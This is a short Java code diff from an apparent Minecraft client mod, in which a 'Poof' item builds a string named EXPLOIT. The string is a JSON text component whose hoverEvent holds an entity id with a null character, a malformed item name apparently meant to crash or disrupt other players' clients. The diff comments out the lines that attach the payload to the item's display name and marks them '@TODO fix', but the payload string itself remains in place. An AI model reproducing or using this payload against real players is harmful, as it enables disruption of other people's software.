@@ -22,8 +22,8 @@ public class Poof extends Item {
     public ItemStack generate() {
         String EXPLOIT = "{\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"type\":\"minecraft:bat\",\"id\":\"\0\"}},\"text\":\"" + name.getValue() + "\"}";
         ItemStack stack = new ItemStack(Items.SALMON);
-        NbtCompound display = stack.getOrCreateSubNbt("display");
-        display.putString("Name", EXPLOIT);
+//        NbtCompound display = stack.getOrCreateSubNbt("display");         @TODO fix
+//        display.putString("Name", EXPLOIT);
         return stack;
     }
 }
